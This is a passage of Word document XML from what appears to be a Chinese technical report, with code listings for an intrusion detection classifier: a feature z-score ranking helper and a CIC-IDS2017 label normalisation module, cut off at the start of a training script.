      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                        for k, cls in enumerate(self.classes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD0D9BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4924999B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46101C34">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792D5B0C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A27EDB6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="162DCC5A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def top_features(self, values, k=5) -&gt; list[dict]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050BA584">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """给诊断报告用的"证据链"：该流在哪几维特征上最偏离训练分布。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203C1F70">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A191431">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        用标准化后的绝对值排序，是启发式而不是归因——</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2BD334">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tree 模型的强项是分裂点，不是逐特征贡献。报告里必须这样措辞。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2BEC51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583EC135">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X = np.asarray(values, dtype=np.float64).reshape(1, -1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DAD2EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        z = np.abs((X[0] - self.scaler.mean_) / np.where(self.scaler.scale_ == 0, 1, self.scaler.scale_))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370C39F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        order = np.argsort(-z)[:k]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5B0284">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B169356">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8B191A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "feature": self.feature_names[i],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB7DDD2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "value": float(X[0, i]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047E8542">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "z_score": round(float(z[i]), 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015EDCE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAB718F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            for i in order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D72270">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B11D011">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F49A7A1">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-16　models/labels.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（31 行）　M8 标签归一化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C7A851">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""CIC-IDS2017 标签归并与归一化，抽样脚本与训练脚本共用同一份，避免两处漂移。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01526FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47677245">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43504133">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F0A2548">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 原始 15 种标签归并到任务书要求的 6 类。键是 normalize_label() 的输出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029D17FB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ★ 映射必须幂等：抽样后的 CSV 里存的就是右边的规范名，训练时再走一遍这个映射</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AA6DE4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#   必须还是自己，否则整类数据会被当成"不属于六类"静默丢掉（Patator 就踩过这个坑）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F38DDD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>LABEL_MAP = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F84DA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "benign": "BENIGN",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757DF17D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "portscan": "PortScan",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A494C65">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "ddos": "DDoS",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DB0495">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "dos hulk": "DoS Hulk",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291C3CEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "patator": "Patator",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC2D63E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "heartbleed": "Heartbleed",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747E5D3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 原始名 -&gt; 规范名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BE61F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "ftp-patator": "Patator",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBBFF2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "ssh-patator": "Patator",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774C8566">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F35C69">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68315C10">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CLASSES = sorted(set(LABEL_MAP.values()))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C91A9C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A42745C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FB425E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def normalize_label(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3DA3A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """小写、空白折叠、各种横线统一成普通短横。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027F0A79">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DB22CC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    CIC-IDS2017 的 Web Attack 标签原本用 en dash 分隔，但 Kaggle 上的版本这个字符</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A96D806">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    已经被上传者写坏成 U+FFFD（实测 2180 处，正好等于三类 Web Attack 的行数），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D31E868">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    所以 U+FFFD 也要当成横线处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427E75D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2768E801">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    s = str(text).replace("–", "-").replace("—", "-").replace("�", "-")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E4FB6F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return " ".join(s.split()).lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7193BCB7">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CC522B9">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-17　models/train.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（591 行）　M8 训练、划分与选型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F047595">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""五模型对比训练与选型。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054A3E53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4428FB32">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
